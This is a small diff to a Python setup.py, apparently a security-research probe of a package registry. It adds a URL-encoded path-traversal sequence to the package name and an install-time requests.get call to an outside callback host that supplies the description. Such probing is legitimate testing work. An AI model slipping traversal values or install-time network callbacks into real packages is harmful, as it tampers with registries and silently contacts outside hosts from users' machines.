@@ -3,7 +3,7 @@ from setuptools import setup
 import requests
 
 setup(
-    name='myghpackage',
+    name='myghpackage%2e%2e%2ftest',
     version='1.0.0',
     description=requests.get("https://bxss.r0l.me/myghpackage-snykdesc"),
     long_description='Some random long description',
